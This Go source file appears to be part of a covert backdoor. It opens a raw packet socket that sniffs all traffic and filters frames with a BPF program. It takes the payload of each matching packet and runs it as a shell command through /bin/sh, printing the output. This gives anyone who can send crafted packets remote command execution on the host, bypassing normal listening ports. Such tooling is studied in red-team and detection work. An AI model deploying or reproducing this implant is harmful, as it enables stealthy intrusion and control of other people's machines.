package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"

	"golang.org/x/net/bpf"
)

var (
	mtu = 1500
)

func createSocket() *os.File {
	// Get a file descriptor and open a raw socket for all incoming packets
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
	if err != nil {
		panic(fmt.Sprintf("Unable to open file for socket, %v", err))
	}
	return os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd))
}

func acceptPacket(socketFile *os.File, vm *bpf.VM, packetChannel chan shadowPacket) {
	for {
		// Read to buffer and create a frame
		frame := make([]byte, mtu)
		numRead, err := socketFile.Read(frame)

		// Check for failed packets and empty packets
		if err != nil {
			fmt.Printf("Unable to read buffer: %v", err)
			continue
		}
		if numRead == 0 {
			fmt.Printf("Empty packet recieved")
			continue
		}

		// Run the VM with instructions
		outputFrameLen, err := vm.Run(frame)
		if err != nil {
			panic(fmt.Sprintf("failed to accept Ethernet frame: %v", err))
		}
		if outputFrameLen > 0 {
			assembledFrame := shadowPacket{
				sourceAddr: frame[26:30],
				sourceMac:  frame[6:12],

				destAddr: frame[30:34],
				destMac:  frame[0:6],

				data: frame[50:numRead],
			}
			packetChannel <- assembledFrame
		}
	}
}

func runCommand(command string) (response string) {
	output, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
	if err != nil {
		return fmt.Sprintf("ERROR: %s", err)
	}
	return string(output)
}

func main() {
	// Create BPF VM
	socketFile := createSocket()
	bpfFilter := createFilter()
	vm, err := bpf.NewVM(bpfFilter)
	if err != nil {
		panic(fmt.Sprintf("failed to load BPF program: %v", err))
	}

	// Create a channel for listening to incoming packets
	socketChannel := make(chan shadowPacket)
	go acceptPacket(socketFile, vm, socketChannel)

	// Connection messages
	fmt.Printf("  %-18s%-18s%-s\n", "SOURCE IP", "DEST IP", "DATA")
	for packet := range socketChannel {
		fmt.Printf("> %-18s%-18s%-s\n", packet.getSourceAddrStr(), packet.getDestAddrStr(), packet.data)

		if len(packet.data) > 0 {
			result := runCommand(string(packet.data))
			fmt.Printf("< %-75s\n", result)
		}
	}
}
